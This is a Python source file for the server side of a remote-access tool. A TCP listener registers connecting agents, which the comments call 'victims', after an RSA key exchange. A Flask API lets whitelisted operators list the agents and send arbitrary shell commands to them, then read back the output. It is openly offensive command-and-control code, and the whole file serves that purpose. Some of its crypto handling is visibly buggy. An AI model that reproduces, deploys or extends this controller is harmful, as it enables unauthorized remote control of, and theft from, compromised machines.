import asyncio
import rsa
import zlib
import uuid
import hashlib
import tomllib
import threading
import time
import socket
import select
import argparse
import logging

from flask import Flask, request, jsonify
from dataclasses import dataclass

from lib import api, logger
from lib.api import HTTP_SESSION
from lib.crypto import EncryptedTunnel, get_hwid

"""
TODO: apply logging in main.py  -> handle_victims
"""

# ----> [ CLI parsing ] <----

parser = argparse.ArgumentParser()
parser.add_argument("--ssl", action="store_true", help="Enable HTTPS")
parser.add_argument("-v", "--verbose", action="store_true")

# --- [ Init variables ] ---

CURRENT_DIR = "/".join(__file__.split("/")[:-1])
CONFIG      = tomllib.load(open(CURRENT_DIR + "/config/config.toml", "rb"))


app_api      = Flask(__name__)
http_session = HTTP_SESSION()


try:
    WHITELIST            = CONFIG.get("whitelist")
    HTTP_IP, HTTP_PORT   = CONFIG.get("http").get("host").split(":")
    AGENT_IP, AGENT_PORT = CONFIG.get("agent").get("host").split(":")
except Exception as e:
    print(e)


@dataclass
class ServerConfig:
    FINGERPRINT = hashlib.sha256((hex(uuid.getnode()) + get_hwid()).encode()).hexdigest()
    BUFSIZE: int

    # { addr: [FINGERPRINT, PCNAME, obj(EncryptedTunnel)]}
    AGENTS: dict

server_cfg = ServerConfig(1024, {})

def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
   
    # >>> [ACCESS] <<<
    
    @app_api.route("/access", methods=["POST"])
    async def access():
        json_body: dict = request.get_json()
        
        USERNAME: str = json_body["username"]
        PASSWORD: str = json_body["password"]

        if USERNAME in WHITELIST:

            password_whitelist_hashed = hashlib.sha256(WHITELIST[USERNAME].encode()).hexdigest()

            if PASSWORD == password_whitelist_hashed:
                # Generate & add session
                session = http_session.add_session(request.remote_addr)
                
                logger.info(f"{request.remote_addr} session generated & added")
                return jsonify({"session": session[1]})
            else:
                logger.info(f"{request.remote_addr} failed to authenticate ({USERNAME}:{PASSWORD})")
                return jsonify({"error": "Username of password invalid"}), 401
    
        else:
            logger.info(f"{request.remote_addr} failed to authenticate ({USERNAME}:{PASSWORD})")
            return jsonify({"error": "Username or password invalid"}), 401

     # >>> [GET_AGENTS] <<<
    
    @app_api.route("/get_agents/<session>")
    async def send_agents(session):

        if http_session.exist(request.remote_addr, session):
            
            # Add agents fingerprint into `agents_fingerprint`
            agents_fingerprint = []
            for v in server_cfg.AGENTS:
                FINGERPRINT = server_cfg.AGENTS[v][0].decode()
                agents_fingerprint.append(FINGERPRINT)

            logger.info(f"{request.remote_addr} fingerprint of the agents sent ({session})")
            return jsonify({"fingerprints": agents_fingerprint})
        
        else:
            logger.info(f"{request.remote_addr} invalid session ({session})")
            return jsonify({"error": "Invalid session"})

    # >>> [ SEND_COMMAND ] <<<

    @app_api.route("/send_command", methods=["POST"])
    async def agent_command():
        json_body: dict = request.get_json()
        
        AGENT_FINGERPRINT = json_body["fingerprint"]
        COMMAND = json_body["command"]

        key_agent = api.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
        
        if not (key_agent is None):
            s: EncryptedTunnel = server_cfg.AGENTS[key_agent][2]
            
            try:
                logger.info(f"sending ({COMMAND}) command to {key_agent}")             
                # TODO: do better  -> set recv dynamic bufsize
                s.send(COMMAND)

                logger.info("command output sended")             
                return jsonify({"output": await s.recv(server_cfg.BUFSIZE).decode()})
            
            except Exception as e:
                logger.error(f"sending command failed: {key_agent}")
                return jsonify({"error": str(e)}), 408
        
        else:
            logger.info(f"failed finding agent ({request.remote_addr}): {AGENT_FINGERPRINT}")
            return jsonify({"error": "This agent don't exist"}), 403
            
    # --- [ Start HTTP(s) server ] ---

    if len(ssl_context) > 0:
        app_api.run(host, port, debug, ssl_context = ssl_context)
    else:
        app_api.run(host, port, debug)

async def handle_agents(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
    PEERNAME = w.get_extra_info('peername')
    CLIENT_SOCKET: socket.socket = w.get_extra_info('socket')
    
    formated_peername = PEERNAME[0] + ':' + str(PEERNAME[1])
    
    logger.info(f"Agent connected: {PEERNAME}")

    # Get a fingerprint (random string)
    fingerprint = await r.read(server_cfg.BUFSIZE)

    logger.info(f"Agent ({PEERNAME}): {fingerprint}")

    # Generate rsa keys
    # will be used for key exchange + nonce to start communicating only with Salsa20
    # (which allows its larger data exchange)
    public_key, private_key = rsa.newkeys(1024) 
    public_key_pem = rsa.PublicKey.save_pkcs1(public_key)

    logger.success(f"RSA key generated\n"+public_key_pem.decode())

    w.write(public_key_pem)
    await w.drain()

    logger.info(f"Agent ({PEERNAME}): RSA key sended")

    # Gets the RSA-encrypted string containing the key and nonce
    decrypted = rsa.decrypt(await r.read(server_cfg.BUFSIZE, private_key))
    decompressed = zlib.decompress(decrypted).split(b"<SPR>")
    
    key, nonce = decompressed.split(b"<SPR>")

    logger.info(f"Agent ({PEERNAME}): key: {key}, nonce: {nonce}")

    # Memory free
    del(decrypted)
    del(decompressed)

    logger.debug(f"init EncryptedTunnel for {PEERNAME}")
    enctunnel = EncryptedTunnel(r, w, key, nonce)

    # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
    server_cfg.AGENTS[formated_peername] = [fingerprint, "pcname", enctunnel]

    CLIENT_SOCKET.setblocking(0)
    ready = select.select([CLIENT_SOCKET], [], [], 5)

    # Stay alive
    while True:
        time.sleep(5)
        try:
            await enctunnel.send(b'2')    
            if ready[0]:
                await enctunnel.recv(2)
        except:
            server_cfg.AGENTS.pop(formated_peername)
            break

async def main():
    args = parser.parse_args()
    logger.debug(f"arguments: {args}")

    # Disable Flask printing
    logging.getLogger("werkzeug").disabled = True

    # Open multiple server
    server_victims = await asyncio.start_server(handle_agents, AGENT_IP, AGENT_PORT)
    
    if args.ssl:
        https_files = (CURRENT_DIR + "/config/website.crt", CURRENT_DIR + "/config/private.key")
        logger.debug(f"SSL: {https_files}")
    
    else:
        https_files = ()

    threading.Thread(target=server_api, args=(HTTP_IP, HTTP_PORT, False, https_files)).start()

    # Looping server
    async with server_victims:
        await server_victims.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())
